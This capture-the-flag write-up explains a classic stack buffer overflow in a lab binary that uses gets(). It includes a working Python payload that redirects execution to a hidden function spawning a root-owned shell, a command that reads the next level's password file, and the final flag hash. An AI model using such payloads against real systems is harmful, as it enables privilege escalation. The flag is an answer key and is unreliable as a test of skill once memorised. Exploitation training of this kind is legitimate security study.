# 💥 Level1 - Classic Buffer Overflow

![Helldivers Salute](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExejJwMnpmeXZ0dHp1enptbDE2am9la2Z4Ymg0eXczcmRiNzFqczJjMSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/VJN5s9dNGXLDqkLYF4/giphy.gif)

Time to learn the classic buffer overflow! 🌊

## 📋 Binary Analysis

### 🔍 Main Function (Ghidra)
```c
void main(void)
{
  char local_50 [76];
  
  gets(local_50);
  return;
}
```

### 🎯 Hidden Run Function
```c
void run(void)
{
  fwrite("Good... Wait what?\n",1,0x13,stdout);
  system("/bin/sh");
  return;
}
```

**Function address**: `0x08048444`

## 🚨 Vulnerability

### The Problem
- `gets()` is **notoriously unsafe** - no boundary checking! ⚠️
- Buffer is only **76 bytes**
- We can overflow to overwrite the **return address**
- Hidden `run()` function spawns a shell with level2 privileges

### The Stack Layout
```
[Buffer: 76 bytes] [Saved EBP: 4 bytes] [Return Address: 4 bytes]
```

## 💣 Exploit

### Finding the Address
```bash
objdump -d level1 | grep "<run>"
# Output: 08048444 <run>
```

### Crafting the Payload
```bash
(python -c 'print "A"*76 + "\x44\x84\x04\x08"'; cat) | ./level1
```

**Breakdown**:
- `"A"*76` → Fill the buffer completely
- `"\x44\x84\x04\x08"` → Overwrite return address with `run()` (little-endian)
- `cat` → Keep stdin open to interact with the spawned shell

### Getting the Flag
```bash
cat /home/user/level2/.pass
```

## 🔑 Key Concepts

- 🚫 **Never use `gets()`** - it's deprecated for a reason!
- 🔄 **Little-endian** - bytes are reversed on x86
- 📚 **Stack layout** - understanding buffer → EBP → return address
- 🎭 **Hidden functions** - always check the symbol table
- 🐱 **`cat` trick** - keeps stdin open for interactive shells

## 🎓 Learning Points

| Concept | Description |
|---------|-------------|
| Buffer Overflow | Writing beyond allocated memory |
| Return Address | Pointer to code execution after function returns |
| Little-endian | Byte order: least significant byte first |
| SUID Binary | Runs with owner's privileges (level2) |

---

> 💡 **Pro Tip**: Use `(python -c '...'; cat)` pattern for any exploit that spawns an interactive shell!

> ⚠️ **Security Note**: This is why modern systems have stack canaries, ASLR, and DEP!

## 🎉 Victory!

![Helldivers Celebration](https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExempicnBhODF0Y3BrZG5zaWIzMmM2MWExdDZuYWNnYWJrdnRtYXg4MyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/MlyicdUndRbn5zUiAL/giphy.gif)

**Flag captured!** 🚩

```
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```